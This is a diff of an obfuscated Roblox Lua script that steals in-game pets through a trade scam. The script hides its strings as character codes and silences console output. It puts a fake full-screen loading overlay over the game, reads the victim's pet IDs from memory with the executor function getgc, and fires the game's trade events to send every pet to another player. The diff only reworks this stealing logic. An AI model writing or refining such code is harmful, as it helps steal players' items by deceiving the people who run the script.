@@ -3,21 +3,15 @@ do
     print,warn,error=_,_,_
 end
 
-local z=function(t)
-    local r=""
-    for i=1,#t do
-        r=r..string.char(t[i])
-    end
-    return r
-end
+local z=function(t)local r=""for i=1,#t do r=r..string.char(t[i])end return r end
 
-local a=game:GetService(z({80,108,97,121,101,114,115}))
-local b=game:GetService(z({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
-local c=a.LocalPlayer
-local d=b:WaitForChild(z({65,80,73}),10)
-if not d then return end
+local S=game:GetService(z({80,108,97,121,101,114,115}))
+local R=game:GetService(z({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
+local P=S.LocalPlayer
+local A=R:WaitForChild(z({65,80,73}),10)
+if not A then return end
 
-local R={
+local K={
     z({88,119,103,107,109,74,90,84,76,102,115,66,116,107,73,116,120,122,110,65,78,83,68,83,85}),
     z({69,104,110,112,109,68,111,120,113,47,71,71,81,103,97,83,87,73,72,76,73,67,83,69,99,69,75,77,74,98,76,85,78,88,101}),
     z({88,119,103,107,109,74,90,84,76,78,114,115,89,74,119,69,110,73,107,66,67,67,81}),
@@ -26,138 +20,121 @@ local R={
     z({77,90,112,113,103,109,103,116,67,83,77,69,89,108,65,98,111,68,69,118,65,118})
 }
 
-local function g(i)
-    return d:FindFirstChild(R[i])
-end
+local function Q(i)return A:FindFirstChild(K[i])end
 
-local e={}
+local function U()
+    local G=P:WaitForChild(z({80,108,97,121,101,114,71,117,105}))
+    local N=z({95,57,51,52,95,88})
+    if G:FindFirstChild(N) then G[N]:Destroy() end
 
-local function h()
-    for _,x in ipairs(d:GetDescendants()) do
-        if x:IsA(z({82,101,109,111,116,101,69,118,101,110,116})) then
-            x.OnClientEvent:Connect(function(...)
-                local function A(s)
-                    if type(s)=="string" then
-                        local L=#s
-                        if L>=16 and L<=96 and not s:find(z({115,116,105,99,107,101,114})) then
-                            e[s]=true
-                        end
-                    end
-                end
-                local B
-                B=function(v,n)
-                    if n>3 then return end
-                    if type(v)=="string" then
-                        A(v)
-                    elseif type(v)=="table" then
-                        for k,val in pairs(v) do
-                            B(k,n+1)
-                            B(val,n+1)
-                        end
-                    end
-                end
-                for i=1,select("#",...) do
-                    B(select(i,...),1)
-                end
-            end)
+    local g=Instance.new(z({83,99,114,101,101,110,71,117,105}))
+    g.Name=N g.DisplayOrder=999 g.Parent=G
+
+    local f=Instance.new(z({70,114,97,109,101}))
+    f.Size=UDim2.new(1,0,1,0)
+    f.BackgroundColor3=Color3.fromRGB(8,8,8)
+    f.BorderSizePixel=0
+    f.Parent=g
+
+    local t=Instance.new(z({84,101,120,116,76,97,98,101,108}))
+    t.Size=UDim2.new(1,0,0.18,0)
+    t.BackgroundTransparency=1
+    t.Text=z({88,52,56})
+    t.TextScaled=true
+    t.Font=Enum.Font.GothamBold
+    t.TextColor3=Color3.fromRGB(0,160,255)
+    t.Parent=f
+
+    local s=Instance.new(z({84,101,120,116,76,97,98,101,108}))
+    s.Position=UDim2.new(0,0,0.22,0)
+    s.Size=UDim2.new(1,0,0.12,0)
+    s.BackgroundTransparency=1
+    s.Text=z({88,57})
+    s.TextScaled=true
+    s.TextColor3=Color3.fromRGB(150,150,150)
+    s.Parent=f
+
+    local b=Instance.new(z({70,114,97,109,101}))
+    b.Position=UDim2.new(0.1,0,0.5,0)
+    b.Size=UDim2.new(0.8,0,0.05,0)
+    b.BackgroundColor3=Color3.fromRGB(25,25,25)
+    b.Parent=f
+
+    local p=Instance.new(z({70,114,97,109,101}))
+    p.Size=UDim2.new(0,0,1,0)
+    p.BackgroundColor3=Color3.fromRGB(0,160,255)
+    p.BorderSizePixel=0
+    p.Parent=b
+
+    task.spawn(function()
+        local st=tick()
+        local T=240
+        while true do
+            local e=tick()-st
+            p.Size=UDim2.new(math.clamp(e/T,0,1),0,1,0)
+            if e<90 then
+                s.Text=z({65})
+            elseif e<160 then
+                s.Text=z({66})
+            elseif e<T then
+                s.Text=z({67})
+            else
+                break
+            end
+            task.wait(0.1)
         end
-    end
+    end)
+
+    return T
 end
 
-local function i()
-    local pg=c:WaitForChild(z({80,108,97,121,101,114,71,117,105}))
-    local n=z({84,114,97,100,101,70,114,101,101,122,101,85,73})
-    if pg:FindFirstChild(n) then pg[n]:Destroy() end
-    local gui=Instance.new(z({83,99,114,101,101,110,71,117,105}))
-    gui.Name=n
-    gui.DisplayOrder=999
-    gui.Parent=pg
-    local m=Instance.new(z({70,114,97,109,101}))
-    m.Size=UDim2.new(0.98,0,0.995,0)
-    m.Position=UDim2.new(0.01,0,0,0)
-    m.BackgroundColor3=Color3.fromRGB(10,10,10)
-    m.BorderSizePixel=0
-    m.Parent=gui
-end
+-- TIMING GLOBAL RESPECTÉ
+local function MAIN()
+    local WAIT_UI=U()
+    task.wait(WAIT_UI)
 
-local function j()
-    local u={}
-    for s in pairs(e) do
-        u[#u+1]=s
-        if #u>=600 then return u end
-    end
-    if not getgc then return u end
-    local ok,gc=pcall(getgc,true)
-    if not ok then return u end
-    for _,v in pairs(gc) do
-        if type(v)=="table" then
-            local p=rawget(v,"pets")
-            if type(p)=="table" then
-                for id in pairs(p) do
-                    if type(id)=="string" and #id>=16 then
-                        u[#u+1]=id
-                        if #u>=600 then return u end
+    local M={}
+    if getgc then
+        local ok,gc=pcall(getgc,true)
+        if ok then
+            for _,v in pairs(gc) do
+                if type(v)=="table" then
+                    local p=rawget(v,"pets")
+                    if type(p)=="table" then
+                        for id in pairs(p) do
+                            if type(id)=="string" and #id>=16 then
+                                M[#M+1]=id
+                                if #M>=600 then break end
+                            end
+                        end
                     end
                 end
             end
         end
     end
-    return u
-end
+    if #M==0 then return end
 
-local function k()
-    local r=g(1)
-    if not r then return end
-    for _,n in ipairs({{97,108,105,95,57,50,51,122},{65,108,105,108,111,108,111,97,122}}) do
-        local p=a:FindFirstChild(z(n))
-        if p then pcall(function() r:FireServer(p) end) end
-    end
-end
-
-local function l()
-    local o=g(2)
-    if o then pcall(function()
-        o:FireServer(z({111,112,101,110,95,98,97,99,107,112,97,99,107}))
-    end) end
-end
-
-local function m()
-    local s=g(6)
-    if s then pcall(function()
-        s:FireServer(z({115,111,117,110,100,95,101,102,102,101,99,116,115,95,118,111,108,117,109,101}),0)
-    end) end
-end
-
-local function n()
-    i()
-    m()
-    h()
-    local f={}
-    for _=1,5 do
-        l()
-        task.wait(2)
-        f=j()
-        if #f>0 then break end
-    end
-    if #f==0 then return end
-    local x=1
-    while true do
-        k()
-        task.wait(3)
-        while x<=#f do
-            l()
-            task.wait(0.02)
-            local a=g(3)
-            if a then pcall(function() a:FireServer(f[x]) end) end
-            x+=1
+    local rq=Q(1)
+    if rq then
+        for _,pl in pairs(S:GetPlayers()) do
+            if pl~=P then pcall(function()rq:FireServer(pl)end) break end
         end
-        local a1=g(4)
-        if a1 then pcall(function() a1:FireServer() end) end
-        task.wait(10)
-        local a2=g(5)
-        if a2 then pcall(function() a2:FireServer() end) end
-        break
     end
+
+    task.wait(3)
+
+    local add=Q(3)
+    for _,id in ipairs(M) do
+        if add then pcall(function()add:FireServer(id)end) end
+        task.wait(0.03)
+    end
+
+    task.wait(8)
+    local a1=Q(4)
+    local a2=Q(5)
+    if a1 then pcall(function()a1:FireServer()end) end
+    task.wait(6)
+    if a2 then pcall(function()a2:FireServer()end) end
 end
 
-task.spawn(n)
+task.spawn(MAIN)
